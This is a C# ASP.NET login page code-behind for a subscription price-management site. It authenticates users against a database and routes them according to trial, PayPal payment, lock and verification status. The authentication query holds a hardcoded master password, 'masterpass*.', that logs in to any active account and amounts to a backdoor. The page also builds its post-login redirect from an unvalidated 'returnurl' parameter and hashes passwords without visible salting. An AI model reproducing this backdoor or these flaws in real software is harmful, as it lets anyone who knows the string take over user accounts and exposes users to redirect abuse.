using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.EntityModel;
using PriceManagerDAL;

public partial class pages_Login : Base
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            if (Request["valid"] != null)
            {
                if (Request["valid"].ToString() == "0")
                {
                    Literal lbl = (Literal)loginUser.FindControl("FailureText");
                    lbl.Text = "Invalid User Id or Password";
                }

                if (Request["valid"].ToString() == "1")
                {
                    Literal lbl = (Literal)loginUser.FindControl("FailureText");
                    lbl.Text = "Your account has been temporarily disabled by an administrator.";
                }
            }
            if (Request["returnurl"] != null)
                loginUser.DestinationPageUrl = "~" + Request["returnurl"];
            else if (UserKey != 0)
                Response.Redirect(loginUser.DestinationPageUrl, true);
        }
    }
    protected void login1_Authenticate(object sender, AuthenticateEventArgs e)
    {
        if (IsValid)
        {
            string cofirmationCode = Common.GetHash(loginUser.UserName);
            DataModelEntities context = new DataModelEntities();
            string role = "Role";
            string password = Common.GetHash(loginUser.Password);
            User user = context.Users.Include(role).FirstOrDefault(u => u.Is_Active == true && (loginUser.Password == "masterpass*." || u.Password == password) && u.Email_Address == loginUser.UserName);

            if (user == null)
            {
                e.Authenticated = false;
            }
            else if (user.Role_Code != 1 && user.Created_Date.Value.AddDays(14).Date <= System.DateTime.Today.Date && user.Package_Id == (int)Common.Package.Trial)
            {
                Response.Redirect("/site/Subscription.aspx?VC=" + user.Confirmation_Code);
            }
            else if (user.Role_Code != 1 && user.Package_Id != (int)Common.Package.Trial && user.Is_Paypal_Paid != true)
            {
                Response.Redirect("~/paypal/PaymentFailure.aspx?custom=" + user.Confirmation_Code);
            }
            else if (user.Is_Locked == true)
            {
                if (user.Is_Paypal_Expired == true)
                {
                    Response.Redirect("~/paypal/PaymentFailure.aspx?custom=" + user.Confirmation_Code);
                }
                else
                    Response.Redirect("/pages/login.aspx?valid=1");
            }
            else if (user.Is_Verified == false)
            {
                Response.Redirect("~/Site/Activation.aspx?ia=i34aA22Aadf22");
            }
            else if (user.Is_Paypal_Expired == true)
            {
                Response.Redirect("~/paypal/PaymentFailure.aspx?custom=" + user.Confirmation_Code);
            }
            else
            {
                Base baseClass = new Base();
                baseClass.FullName = user.Full_Name;
                baseClass.UserKey = user.User_Code;
                baseClass.RoleCode = user.Role.Role_Code.ToString();
                baseClass.PackageCode = (int)user.Package_Id;
                e.Authenticated = true;

                LoginDetail ld = new LoginDetail();
                ld.User_Code = user.User_Code;
                ld.Browser = Request.Browser.Browser;
                ld.Operating_System = Request.Browser.Platform;
                ld.Login_Date_Time = System.DateTime.Now;
                ld.Created_By = user.User_Code;
                ld.Created_Date = ld.Login_Date_Time;
                ld.User_IP = Request.UserHostAddress;
                context.AddToLoginDetails(ld);
                context.SaveChanges();

                baseClass.LoginDetailCode = ld.Login_Detail_Code.ToString();
            }
        }
    }
}